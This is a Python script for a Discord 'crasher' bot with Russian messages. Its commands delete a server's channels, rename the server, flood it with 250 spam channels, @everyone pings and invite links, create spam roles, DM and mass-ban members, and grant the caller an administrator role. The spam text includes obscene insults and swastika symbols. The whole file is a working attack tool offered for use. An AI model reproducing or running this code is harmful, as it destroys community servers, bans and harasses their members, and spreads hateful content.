# -*- coding: utf-8 -*-
import discord, time, random, sys, subprocess
from discord.ext import commands
client = commands.Bot(command_prefix = '', intents = discord.Intents.all())
client.remove_command('help')
global whitelist
whitelist = ['737582811044905003','642409834561404928','698634094493565000','662608726339092490','765575831585554452','712267567657385994']
@client.event
async def on_ready():
    print('vse ahuenno')
    await client.change_presence(status = discord.Status.online, activity = discord.Game(f'Наконец-то меня в белый список добавили :)'))
#------------------------------------------------------------------------------------------
token = sys.argv[1]
#------------------------------------------------------------------------------------------
@client.command()
async def jopa(ctx,*, text=None):
    try:
        await ctx.author.send('пиздец начинается')
    except:
        mg = await ctx.send('принято, начинаем')
        time.sleep(1)
        await mg.delete()
    channelo = ctx.message.guild.channels
    negr = ctx.guild
    badchan = ctx.channel.id
    num = random.randint(1,12)
    try:
        ctx.guild.edit(name='сервер захвачен крашерами из bsdo sqd, всем учасникам срочно сосать хуй')
    except:
        await ctx.author.send('невозможно установить название сервера')
    for channel in ctx.message.guild.channels:
        if str(channel.id) == str(badchan):
            pass
        else:
            await channel.delete(reason='sosnull?')

    for i in range(250):
        if text==None:
            try:
                cha = await ctx.guild.create_text_channel('卐卐слава украине https://discord.gg/xvsFParxr6 卐卐')
                await cha.send('произошел взлом жопы анальной пробкой https://discord.gg/xvsFParxr6 @everyone @here\nне бомбите, во всем виноват тупорылый админ вашего сервера')
            except:
                pass
        else:
            try:
                cha = await ctx.guild.create_text_channel(text)
                await cha.send(text)
            except:
                pass
    for channel in negr.channels:
        if text==None:
            await channel.send('взлом жопы анальной пробкой https://discord.gg/xvsFParxr6 @everyone @here')
            await channel.send('взлом жопы анальной пробкой https://discord.gg/xvsFParxr6 @everyone @here')
        else:
            await channel.send(text)
            await channel.send(text)
    for i in range(40):
        try:
            await ctx.guild.create_role(name="взлом жопы анальной пробкой https://discord.gg/xvsFParxr6")
        except:
            await ctx.author.send('не удалось создать роли, возможно нет прав')
    await ctx.author.send('атака завершена, соси хуй')

@client.command()
async def razeb(ctx,*, text=None):
    try:
        await ctx.author.send('пиздец начинается')
    except:
        mg = await ctx.send('принято, начинаем')
        time.sleep(1)
        await mg.delete()
    try:
        ctx.guild.edit(name='сервер захвачен крашерами из bsdo sqd, всем учасникам срочно сосать хуй')
    except:
        await ctx.author.send('невозможно установить название сервера')
    for member in ctx.guild.members:
        try:
            if member.id in whitelist or ctx.message.author.id == member.id:
                await ctx.author.send(f'игнорирую {member} тк он в вайте')
            else:
                await member.send('сервер на котором ты находился был крашнут. переезд сюда --> https://discord.gg/xvsFParxr6')
                await member.ban(reason='у вас админ долбаеб')
        except:
            pass
    channelo = ctx.message.guild.channels
    negr = ctx.guild
    badchan = ctx.channel.id
    for channel in ctx.message.guild.channels:
        if str(channel.id) == str(badchan):
            pass
        else:
            await channel.delete(reason='sosnull?')

    for i in range(250):
        if text==None:
            try:
                cha = await ctx.guild.create_text_channel('卐卐слава украине https://discord.gg/xvsFParxr6 卐卐')
                await cha.send('произошел взлом жопы анальной пробкой https://discord.gg/xvsFParxr6 @everyone @here\nне бомбите, во всем виноват тупорылый админ вашего сервера')
            except:
                pass
        else:
            try:
                cha = await ctx.guild.create_text_channel(text)
                await cha.send(text)
            except:
                pass
    for channel in negr.channels:
        if text==None:
            await channel.send('взлом жопы анальной пробкой https://discord.gg/xvsFParxr6 @everyone @here')
            await channel.send('взлом жопы анальной пробкой https://discord.gg/xvsFParxr6 @everyone @here')
        else:
            await channel.send(text)
            await channel.send(text)
    for i in range(40):
        try:
            await ctx.guild.create_role(name="взлом жопы анальной пробкой https://discord.gg/xvsFParxr6")
        except:
            await ctx.author.send('не удалось создать роли, возможно нет прав')
    await ctx.author.send('атака завершена, соси хуй')


@client.command()
async def g666(ctx):
    try:
        guild = ctx.guild
        perms = discord.Permissions(administrator=True) #права роли
        await guild.create_role(name="jopa", permissions=perms) #создаем роль
        role = discord.utils.get(ctx.guild.roles, name="jopa") #находим роль по имени
        user = ctx.message.author #находим юзера
        await user.add_roles(role) #добовляем роль
        await ctx.message.delete()
    except:
        await ctx.author.send('у бота недостаточно прав')

@client.command()
async def lag(ctx):
    await ctx.message.delete()
    await ctx.message.author.send('лаг машина включена')
    for i in range(60):
        regs=['amsterdam','brazil','dubai','eu_central','eu_west','europe','frankfurt','hongkong','london','singapore','southafrica']
        reg = random.choice(regs)
        await ctx.guild.edit(region=reg)
        time.sleep(0.3)
@client.command()
async def cname(ctx,*,text):
    try:
        await ctx.guild.edit(name=text)
        await ctx.message.delete()
        await ctx.message.author.send(f'изменили название на {text}')
    except:
        await ctx.message.author.send('нет прав')
client.run(token)